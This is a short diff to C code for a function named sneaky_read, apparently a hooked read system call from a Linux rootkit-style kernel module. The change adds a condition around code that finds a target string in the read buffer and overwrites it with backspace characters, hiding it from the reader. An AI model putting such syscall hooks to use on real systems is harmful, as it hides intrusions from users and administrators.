@@ -109,11 +109,13 @@ asmlinkage int sneaky_read(int fd, void *buf, size_t count)
       break;
     }
   }
-  char * locale = strstr(haystack, needle);
-  if (locale != NULL) {
-    for (j = 0; j < 33; j++) {
-      *(locale) = '\b';
-      locale++;
+  if (check == 1) {
+    char * locale = strstr(haystack, needle);
+    if (locale != NULL) {
+      for (j = 0; j < 34; j++) {
+	*(locale) = '\b';
+	locale++;
+      }
     }
   }
   return ret;
